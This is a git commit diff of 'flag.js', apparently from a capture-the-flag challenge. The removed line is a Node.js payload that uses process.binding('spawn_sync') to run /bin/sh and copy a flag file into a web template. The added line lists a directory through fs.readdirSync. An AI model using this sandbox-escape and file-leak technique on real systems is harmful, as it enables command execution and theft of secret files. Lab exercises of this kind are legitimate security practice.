9774d3eb477bf544b09dab9d2fb2929d7fd4d41b
kimdhs <149690629+kimdhs@users.noreply.github.com>
2024-08-01 16:33:06 +0900

    Update flag.js
    Signed-off-by: kimdhs <149690629+kimdhs@users.noreply.github.com>

--- flag.js
+++ flag.js
@@ -1,1 +1,1 @@
-process.binding('spawn_sync').spawn({file: '/bin/sh',args: ['/bin/sh', '-c', 'cat .flag.txt > ./templates/report.html'],stdio: [{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}]});
+require('fs').readdirSync(uint8array);
